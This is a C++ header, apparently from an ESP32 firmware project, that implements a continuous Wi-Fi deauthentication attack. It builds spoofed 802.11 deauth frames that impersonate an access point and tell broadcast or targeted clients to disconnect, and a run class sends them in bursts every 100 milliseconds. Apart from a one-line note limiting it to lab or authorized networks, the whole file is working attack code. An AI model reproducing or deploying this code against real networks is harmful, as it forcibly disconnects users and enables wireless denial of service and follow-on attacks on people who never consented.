#pragma once

#include <cstddef>
#include <cstdint>
#include <cstring>

namespace radar {

// Continuous deauthentication attack (lab use: your own or authorized
// networks only). The radio glue in src/ transmits these frames with
// esp_wifi_80211_tx(); this header owns the frame bytes and the run state.

constexpr size_t kDeauthLen = 26;

// Builds a deauthentication management frame as if sent by the AP `bssid`
// (spoofed source, matching BSSID field), telling `dest` — broadcast, or one
// specific client MAC — to disconnect. `seq` is truncated to the 12-bit
// 802.11 sequence number; increment it between sends so stations do not
// discard repeats as duplicates. `reason` is an 802.11 reason code
// (7 = "Class 3 frame from a nonassociated STA" is the usual choice).
inline void buildDeauth(uint8_t out[kDeauthLen], const uint8_t bssid[6],
                        const uint8_t dest[6], uint16_t seq, uint16_t reason) {
  std::memset(out, 0, kDeauthLen);
  out[0] = 0xC0;  // frame control: management (type 0), deauth (subtype 12)
  out[1] = 0x00;  // no flags
  std::memcpy(out + 4, dest, 6);    // DA: who is told to leave
  std::memcpy(out + 10, bssid, 6);  // SA: the AP we are spoofing
  std::memcpy(out + 16, bssid, 6);  // BSSID
  const uint16_t seq12 = seq & 0x0FFF;
  out[22] = static_cast<uint8_t>((seq12 & 0x0F) << 4);  // frag 0 + seq[3:0]
  out[23] = static_cast<uint8_t>(seq12 >> 4);           // seq[11:4]
  out[24] = static_cast<uint8_t>(reason & 0xFF);
  out[25] = static_cast<uint8_t>(reason >> 8);
}

inline const uint8_t* broadcastMac() {
  static const uint8_t m[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  return m;
}

// One deauth run: counts what was sent, paces the bursts, and freezes the
// elapsed time when stopped so the screen can show how long it lasted.
class DeauthRun {
 public:
  static constexpr uint32_t kBurstMs = 100;

  void start(uint32_t now) {
    running_ = true;
    startedAt_ = now;
    lastBurstAt_ = now - kBurstMs;  // the first burst is due immediately
    sent_ = 0;
  }

  void stop(uint32_t now) {
    if (!running_) return;
    running_ = false;
    stoppedAt_ = now;
  }

  bool running() const { return running_; }
  uint32_t sent() const { return sent_; }

  uint32_t elapsedMs(uint32_t now) const {
    return running_ ? now - startedAt_ : stoppedAt_ - startedAt_;
  }

  bool burstDue(uint32_t now) const {
    return running_ && now - lastBurstAt_ >= kBurstMs;
  }

  void addSent(int n, uint32_t now) {
    sent_ += static_cast<uint32_t>(n);
    lastBurstAt_ = now;
  }

 private:
  bool running_ = false;
  uint32_t startedAt_ = 0;
  uint32_t stoppedAt_ = 0;
  uint32_t lastBurstAt_ = 0;
  uint32_t sent_ = 0;
};

}  // namespace radar